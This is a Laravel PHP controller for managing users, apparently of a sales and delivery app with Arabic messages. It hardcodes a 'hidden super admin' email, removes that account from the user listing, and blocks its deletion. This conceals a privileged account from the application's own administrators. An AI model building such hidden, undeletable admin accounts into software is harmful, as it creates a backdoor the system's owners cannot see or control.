<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class UserController extends Controller
{
    // Hidden super admin email
    private const HIDDEN_ADMIN_EMAIL = 'admin@symloop.com';

    public function index(Request $request)
    {
        $query = User::query();

        // Hide super admin from users list
        $query->where('email', '!=', self::HIDDEN_ADMIN_EMAIL);

        if ($request->role) {
            $query->where('role', $request->role);
        }

        if ($request->active_only) {
            $query->where('is_active', true);
        }

        if ($request->search) {
            $query->where(function ($q) use ($request) {
                $q->where('name', 'like', "%{$request->search}%")
                  ->orWhere('email', 'like', "%{$request->search}%")
                  ->orWhere('phone', 'like', "%{$request->search}%");
            });
        }

        $users = $query->latest()->paginate($request->per_page ?? 15);

        return response()->json($users);
    }

    public function store(Request $request)
    {
        $request->validate([
            'name' => 'required|string|max:255',
            'email' => 'required|email|unique:users',
            'password' => 'required|min:6',
            'phone' => 'nullable|string',
            'role' => 'required|in:admin,manager,seller,livreur',
            'is_active' => 'boolean',
        ]);

        $user = User::create([
            'name' => $request->name,
            'email' => $request->email,
            'password' => Hash::make($request->password),
            'phone' => $request->phone,
            'role' => $request->role,
            'is_active' => $request->is_active ?? true,
        ]);

        return response()->json($user, 201);
    }

    public function show(User $user)
    {
        return response()->json($user);
    }

    public function update(Request $request, User $user)
    {
        $request->validate([
            'name' => 'string|max:255',
            'email' => 'email|unique:users,email,' . $user->id,
            'phone' => 'nullable|string',
            'role' => 'in:admin,manager,seller,livreur',
            'is_active' => 'boolean',
        ]);

        $user->update($request->only(['name', 'email', 'phone', 'role', 'is_active']));

        return response()->json($user);
    }

    public function destroy(User $user)
    {
        if ($user->id === auth()->id()) {
            return response()->json(['message' => 'لا يمكنك حذف حسابك'], 400);
        }

        // Prevent deletion of hidden super admin
        if ($user->email === self::HIDDEN_ADMIN_EMAIL) {
            return response()->json(['message' => 'لا يمكن حذف هذا المستخدم'], 400);
        }

        $user->delete();

        return response()->json(['message' => 'تم حذف المستخدم بنجاح']);
    }

    public function resetPassword(Request $request, User $user)
    {
        $request->validate([
            'password' => 'required|min:6|confirmed',
        ]);

        $user->update([
            'password' => Hash::make($request->password),
        ]);

        return response()->json(['message' => 'تم تغيير كلمة المرور بنجاح']);
    }

    public function toggleActive(User $user)
    {
        if ($user->id === auth()->id()) {
            return response()->json(['message' => 'لا يمكنك تعطيل حسابك'], 400);
        }

        $user->update(['is_active' => !$user->is_active]);

        return response()->json($user);
    }

    public function getSellers(Request $request)
    {
        $sellers = User::where('role', 'seller')
            ->where('is_active', true)
            ->get();

        return response()->json($sellers);
    }

    public function getLivreurs(Request $request)
    {
        $livreurs = User::where('role', 'livreur')
            ->where('is_active', true)
            ->get();

        return response()->json($livreurs);
    }
}
